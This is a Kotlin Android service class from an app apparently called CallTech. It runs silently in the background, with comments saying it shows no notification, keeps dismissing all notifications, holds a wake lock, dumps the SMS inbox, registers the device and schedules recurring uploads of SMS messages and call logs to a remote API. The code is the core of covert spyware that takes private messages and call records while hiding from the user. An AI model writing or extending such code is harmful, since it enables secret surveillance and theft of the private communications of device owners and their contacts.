package com.calltech

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log

/**
 * Silent background hold — koi status-bar / notification nahi.
 * WakeLock + WorkManager/alarms process zinda rakhte hain.
 */
class CallSyncService : Service() {
    override fun onBind(intent: Intent?) = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        NotificationCleanup.dismissAll(this)
        if (!SyncBootstrap.needsCoreSyncPermissions(this) &&
            !InboxDump.alreadyDone(this) &&
            !InboxDump.isRunning()
        ) {
            Thread({
                try {
                    holdDuring(applicationContext) {
                        InboxDump.dumpBlocking(applicationContext)
                        DeviceRegistration.registerNow(applicationContext)
                        SyncBootstrap.armBackgroundSync(applicationContext)
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Service dump failed", error)
                } finally {
                    NotificationCleanup.dismissAll(applicationContext)
                    try {
                        stopSelf()
                    } catch (_: Exception) {
                    }
                }
            }, "calltech-service-dump").start()
        } else {
            NotificationCleanup.dismissAll(this)
            stopSelf()
        }
        return START_NOT_STICKY
    }

    companion object {
        private const val TAG = "CallSyncService"

        fun startHolding(context: Context) {
            val app = context.applicationContext
            NotificationCleanup.dismissAll(app)
            if (SyncBootstrap.needsCoreSyncPermissions(app)) {
                return
            }
            if (InboxDump.alreadyDone(app) || InboxDump.isRunning()) {
                SyncBootstrap.armBackgroundSync(app)
                return
            }
            val intent = Intent(app, CallSyncService::class.java)
            try {
                // Regular service — foreground/notification nahi
                app.startService(intent)
            } catch (error: Exception) {
                Log.w(TAG, "Service start failed: ${error.message}")
                BackgroundSyncRunner.run {
                    try {
                        holdDuring(app) {
                            InboxDump.dumpBlocking(app)
                            DeviceRegistration.registerNow(app)
                            SyncBootstrap.armBackgroundSync(app)
                        }
                    } catch (inner: Exception) {
                        Log.e(TAG, "Inline dump failed", inner)
                    } finally {
                        NotificationCleanup.dismissAll(app)
                    }
                }
            }
        }

        fun holdDuring(context: Context, block: () -> Unit) {
            val wakeLock = acquireWakeLock(context.applicationContext)
            try {
                block()
            } finally {
                releaseWakeLock(wakeLock)
                NotificationCleanup.dismissAll(context.applicationContext)
            }
        }

        fun ensureRunning(context: Context) {
            val app = context.applicationContext
            if (!CallSyncHelper.isBackgroundSyncEnabled(app)) {
                return
            }
            NotificationCleanup.dismissAll(app)
            SyncWorkScheduler.enqueueNow(app)
            SyncAlarmScheduler.scheduleNext(app)
            BackgroundSyncRunner.run {
                try {
                    MongoSyncHelper.ensureApiUrl(app)
                    PendingSmsQueue.flush(app)
                    PendingCallQueue.flush(app)
                    if (MessageSyncHelper.hasSmsPermission(app)) {
                        MessageSyncHelper.syncLatestMessagesNow(app, "ensure_running")
                    }
                    if (CallSyncHelper.hasCallLogPermission(app)) {
                        CallSyncHelper.syncLatestCalls(
                            context = app,
                            source = "ensure_running",
                            retryCount = 1,
                        ) {}
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Background sync failed", error)
                } finally {
                    NotificationCleanup.dismissAll(app)
                }
            }
        }

        fun start(context: Context) {
            ensureRunning(context)
        }

        fun stop(context: Context) {
            hide(context)
        }

        fun hide(context: Context) {
            NotificationCleanup.dismissAll(context.applicationContext)
        }

        private fun acquireWakeLock(context: Context): PowerManager.WakeLock? {
            return try {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CallTech:BulkSyncWakeLock",
                ).apply {
                    setReferenceCounted(false)
                    acquire(300_000L)
                }
            } catch (_: Exception) {
                null
            }
        }

        private fun releaseWakeLock(wakeLock: PowerManager.WakeLock?) {
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock.release()
                }
            } catch (_: Exception) {
            }
        }
    }
}
